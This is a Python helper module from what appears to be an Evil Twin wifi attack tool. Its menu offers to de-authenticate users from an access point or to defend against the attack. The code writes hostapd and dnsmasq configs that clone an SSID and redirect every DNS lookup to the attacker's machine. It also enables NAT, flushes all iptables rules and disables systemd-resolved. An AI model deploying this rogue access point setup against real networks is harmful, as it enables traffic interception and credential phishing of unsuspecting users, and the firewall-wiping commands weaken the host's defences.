import time
from scapy.all import *
import os


def get_type():
    result = int(input("Choose the type of action to run:\n1- Attack and de-authenticate user from AP\n2- Defend from "
                       "Evil Twin Attack\n3- Exit\n\n"))
    if result not in [1, 2, 3]:
        print("Wrong input, please try again!")
        get_type()
    return result


def scan_channels(iface, channel):
    print(f"Currently scanning for AP's in channel: {channel}")
    os.system(f"sudo iwconfig {iface} channel {channel}")


def create_hostapd_file(iface, ssid):
    interface = f"interface={str(iface)}\n"
    driver = "driver=nl80211\n"
    ssid = f"ssid={str(ssid)}\n"
    channel = "channel=1\n"
    conf_data = interface + driver + ssid + channel
    with open("conf_files/hostapd.conf", 'w+') as conf_file:
        conf_file.write(conf_data)
    os.chmod("conf_files/hostapd.conf", 0o777)


# Dynamic Host Configuration Protocol (DHCP) is a client/server protocol that automatically provides an IP host with its
# IP address and other related configuration information such as the subnet mask and default gateway.
# dhcp option=3: IP gateway, option=6: DNS server 
def create_dnsmasq_file(iface):
    iface = f"interface={str(iface)}\n"
    body = "dhcp-range=10.0.0.3,10.0.0.100,12h\n"+\
            "dhcp-option=3,10.0.0.1\n"+\
            "dhcp-option=6,10.0.0.1\n"+\
            "server=8.8.8.8\n"+\
            "address=/#/10.0.0.1\n"

    conf_data = iface + body
    with open("conf_files/dnsmasq.conf", 'w+') as conf_file:
        conf_file.write(conf_data)
    os.chmod("conf_files/dnsmasq.conf", 0o777)


def delete_conf_files():
    try:
        os.system("rm conf_files/*.conf")
    except:
        print("No configuration files to delete...")


# Start and run AP connection using built conf hostapd and dnsmasq files
def start_ap():
    os.system("sudo systemctl stop hostapd")
    os.system("sudo systemctl stop dnsmasq")
    os.system("sudo killall dnsmasq")
    os.system("sudo killall hostapd")
    os.system("sudo hostapd conf_files/hostapd.conf -B")
    os.system("sudo dnsmasq -C conf_files/dnsmasq.conf")


def enable_nat(eth):
    """
    iptables is a command-line firewall utility that uses policy chains to allow or block traffic.
    Masquerade is an algorithm dependant on the iptables implementation that allows one to route traffic without
    disrupting the original traffic. We use it when creating a virtual wifi adapter and share our wifi connection via
    masquerading it to a virtual adapter. In other words... "Share our wifi connection through wifi"
    """
    os.system(f"sudo iptables -t nat -A POSTROUTING -o {eth} -j MASQUERADE")


def reset():
    delete_conf_files()
    # os.system("sudo service NetworkManager start")
    os.system("sudo systemctl stop hostapd")
    os.system("sudo systemctl stop dnsmasq")
    os.system("sudo killall dnsmasq")
    os.system("sudo killall hostapd")
    # os.system("sudo systemctl enable systemd-resolved.service")
    os.system("sudo systemctl disable systemd-resolved")
    # os.system("sudo systemctl start systemd-resolved")
    os.system("sudo systemctl mask systemd-resolved")
    os.system("sudo systemctl stop systemd-resolved")


def kill_processes():
    os.system("sudo pkill -9 hostapd")
    os.system("sudo pkill -9 dnsmasq")
    # os.system("sudo pkill -9 wpa_supplicant")
    # os.system("sudo pkill -9 avahi-daemon")
    # os.system("sudo pkill -9 dhclient")


def ip_tables_config():
    os.system("sudo iptables --flush")
    os.system("sudo iptables --table nat --flush")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    os.system("sudo iptables -P FORWARD ACCEPT")

